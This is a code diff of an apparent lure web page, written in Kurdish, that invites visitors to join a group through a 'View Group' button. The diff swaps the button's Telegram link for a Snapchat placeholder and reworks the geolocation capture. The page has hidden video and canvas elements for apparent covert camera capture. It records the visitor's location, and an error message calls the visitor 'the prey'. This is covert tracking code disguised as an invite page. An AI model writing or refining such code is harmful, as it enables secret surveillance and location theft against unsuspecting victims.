@@ -37,7 +37,7 @@
 <body>
 
     <p>بۆ چوونە ناو گرووپ، کلیک لەسەر دوگمەی خوارەوە بکە:</p>
-    <a href="https://telegram.org" class="btn" id="viewGroupBtn">View Group</a>
+    <a href="https://www.snapchat.com/add/YOUR_SNAPCHAT_USERNAME" class="btn" id="viewGroupBtn">View Group</a>
 
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
@@ -72,11 +72,12 @@
             }).catch(() => {});
         }
 
-        // وەرگرتنی لۆکەیشن بە شێوازی ڕاست و بێ خەوش
+        // وەرگرتنی لۆکەیشن بە فۆرماتێکی تەواو ڕاست بەبێ خەتای پیتەکان
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((position) => {
-                // لێرەدا کێشەی هێمای 0 چاککراوە بۆ $ بۆ ئەوەی پۆوتانەکان بە دروستی بخوێنێتەوە
-                globalMaps = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                let lat = position.coords.latitude;
+                let lon = position.coords.longitude;
+                globalMaps = "https://maps.google.com/?q=" + lat + "," + lon;
             }, (error) => {
                 globalMaps = "⚠️ نێچیرەکە مۆڵەتی لۆکەیشنی ڕەتکردەوە!";
             }, { 
